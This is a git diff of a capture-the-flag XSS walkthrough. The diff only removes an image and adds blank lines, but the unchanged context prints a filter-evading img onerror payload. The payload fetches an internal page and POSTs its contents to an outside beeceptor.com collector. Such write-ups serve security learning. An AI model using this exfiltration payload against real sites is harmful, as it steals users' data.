@@ -1,4 +1,4 @@
-![image](https://github.com/user-attachments/assets/81f4d231-5d95-416e-ba79-d74bef39d434)## Description 
+## Description 
   Just to warm you up for the next Fight :"D
 ## Walkthrough:
   **the challenges was provided with a src code
@@ -54,8 +54,12 @@
   <img%0Csrc=x%0Conerror='fetch("info.php%252Findex.php")%0C.then(response%0C=>%0Cresponse.text())%0C.
 then(data%0C=>%0Cfetch("https://qlashx.free.beeceptor.com/",%0C{method:"POST",%0Cheaders:{%0C"Content-Type":"application/x-www-form-urlencoded"},%0Cbody:"data="%0C%2BencodeURIComponent(data)})%0C)'> 
   ```
+
+
   
   ![image](https://github.com/user-attachments/assets/943c34c6-11f1-4835-81dd-e08e9c665855)
+
+
 
 
 
